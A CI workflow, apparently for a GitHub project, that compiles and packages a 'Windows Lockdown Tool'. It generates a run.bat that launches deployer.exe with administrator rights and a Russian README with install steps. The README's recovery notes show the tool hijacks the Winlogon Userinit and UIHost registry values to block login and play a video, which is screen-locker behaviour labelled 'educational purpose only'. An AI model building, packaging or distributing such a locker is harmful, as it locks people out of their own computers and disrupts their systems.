name: Build Windows Lockdown Tool

on:
  push:
    branches: [ "main", "master", "dev" ]
  pull_request:
    branches: [ "main", "master" ]
  workflow_dispatch:
    inputs:
      debug_enabled:
        description: 'Enable debug mode'
        required: false
        default: false
        type: boolean

env:
  CARGO_TERM_COLOR: always
  RUST_BACKTRACE: 1

jobs:
  build-windows:
    name: Build on Windows
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Display structure
      run: |
        echo "=== Current directory ==="
        pwd
        echo "=== Files ==="
        ls -la
    
    - name: Setup Rust
      uses: actions-rs/toolchain@v1
      with:
        toolchain: stable
        target: x86_64-pc-windows-msvc
        override: true
        components: rustfmt, clippy
    
    - name: Cache cargo registry
      uses: actions/cache@v3
      with:
        path: |
          ~/.cargo/bin/
          ~/.cargo/registry/index/
          ~/.cargo/registry/cache/
          ~/.cargo/git/db/
          target/
        key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
        restore-keys: |
          ${{ runner.os }}-cargo-
    
    - name: Create dummy video.mp4
      run: |
        if (-not (Test-Path "video.mp4")) {
          echo "Creating dummy video.mp4"
          # Создаём минимальный валидный MP4 файл (10 байт для компиляции)
          $bytes = [System.Convert]::FromBase64String("AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJhZQ==")
          [System.IO.File]::WriteAllBytes("video.mp4", $bytes)
        }
    
    - name: Build release binaries
      run: cargo build --release --target x86_64-pc-windows-msvc --verbose
    
    - name: List artifacts
      run: |
        echo "=== Built executables ==="
        Get-ChildItem -Path target\x86_64-pc-windows-msvc\release\*.exe | ForEach-Object {
          $hash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
          Write-Host "$($_.Name) - $([math]::Round($_.Length/1KB, 2)) KB - SHA256: $($hash.Substring(0, 16))..."
        }
    
    - name: Prepare deployment package
      run: |
        New-Item -ItemType Directory -Force -Path deploy
        
        Copy-Item target\x86_64-pc-windows-msvc\release\deployer.exe deploy\
        Copy-Item target\x86_64-pc-windows-msvc\release\gate_keeper.exe deploy\
        Copy-Item target\x86_64-pc-windows-msvc\release\screen_holder.exe deploy\
        
        if (Test-Path "video.mp4") {
          Copy-Item video.mp4 deploy\
        }
        
        # Создаём run.bat
        @"
        @echo off
        title Zero Entry Installer
        color 4F
        echo ========================================
        echo  WINDOWS LOCKDOWN TOOL - INSTALLER
        echo ========================================
        echo.
        echo ВНИМАНИЕ! Данный инструмент предназначен
        echo для образовательных целей.
        echo.
        echo Установка требует прав администратора.
        echo.
        pause
        powershell -Command "Start-Process -FilePath '.\deployer.exe' -Verb RunAs -Wait"
        echo.
        echo Установка завершена. Система будет перезагружена.
        pause
        "@ | Out-File -FilePath deploy\run.bat -Encoding ASCII
        
        # Создаём README
        @"
        =============================================
        WINDOWS LOCKDOWN TOOL - v1.0.0
        =============================================
        
        СОСТАВ:
        - deployer.exe      - установщик (запускать от администратора)
        - gate_keeper.exe   - модуль блокировки входа
        - screen_holder.exe - модуль воспроизведения видео
        - video.mp4         - видеофайл (опционально)
        
        ИНСТРУКЦИЯ:
        1. Распаковать архив
        2. Запустить run.bat или deployer.exe от имени администратора
        3. Система перезагрузится автоматически
        
        ВОССТАНОВЛЕНИЕ:
        - Загрузиться с LiveUSB/LiveCD
        - Открыть реестр (regedit) с загрузкой HKEY_LOCAL_MACHINE
        - Восстановить ветку:
          HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
          Userinit = "userinit.exe,"
          UIHost = "logonui.exe"
        - Удалить файлы из C:\Windows\System32:
          deployer.exe, gate_keeper.exe, screen_holder.exe
        
        =============================================
        (c) Educational Purpose Only
        =============================================
        "@ | Out-File -FilePath deploy\README.txt -Encoding ASCII
    
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: lockdown-tool-windows
        path: deploy/
        retention-days: 30
        compression-level: 6
    
    - name: Create archive
      run: |
        Compress-Archive -Path deploy\* -DestinationPath lockdown_tool.zip -Force
        echo "Archive created: $(Get-Item lockdown_tool.zip).Length bytes"
    
    - name: Upload archive
      uses: actions/upload-artifact@v4
      with:
        name: lockdown-tool-archive
        path: lockdown_tool.zip
        retention-days: 30

  verify-build:
    name: Verify Build Integrity
    runs-on: windows-latest
    needs: build-windows
    
    steps:
    - name: Download artifacts
      uses: actions/download-artifact@v4
      with:
        name: lockdown-tool-windows
        path: downloaded
    
    - name: Verify executables
      run: |
        echo "=== Verifying downloaded files ==="
        Get-ChildItem -Path downloaded\*.exe | ForEach-Object {
          if (Test-Path $_.FullName) {
            $size = [math]::Round($_.Length/1KB, 2)
            Write-Host "✓ $($_.Name) - $size KB - OK"
          }
        }
        
        # Проверяем, что это действительно PE-файлы
        Get-ChildItem -Path downloaded\*.exe | ForEach-Object {
          $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
          if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
            Write-Host "✓ $($_.Name) - valid PE executable"
          } else {
            Write-Host "✗ $($_.Name) - NOT a valid PE file"
            exit 1
          }
        }
    
    - name: Clean test environment
      run: |
        Remove-Item -Path downloaded -Recurse -Force -ErrorAction SilentlyContinue

  lint:
    name: Lint and Format
    runs-on: ubuntu-latest
    needs: build-windows
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    - name: Setup Rust
      uses: actions-rs/toolchain@v1
      with:
        toolchain: stable
        override: true
        components: rustfmt, clippy
    
    - name: Create dummy video
      run: touch video.mp4
    
    - name: Check formatting
      run: cargo fmt -- --check
    
    - name: Clippy check
      run: cargo clippy --target x86_64-unknown-linux-gnu -- -D warnings

  security-audit:
    name: Security Audit
    runs-on: ubuntu-latest
    needs: lint
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    - name: Install cargo-audit
      run: cargo install cargo-audit
    
    - name: Run security audit
      run: |
        cargo audit
      continue-on-error: true
    
    - name: Check for unsafe blocks
      run: |
        echo "=== Unsafe blocks summary ==="
        find src -name "*.rs" -exec grep -c "unsafe" {} \; | awk '{sum+=$1} END {print "Total unsafe blocks:", sum}'
        find src -name "*.rs" -exec grep -l "unsafe" {} \; | sed 's/^/  /'
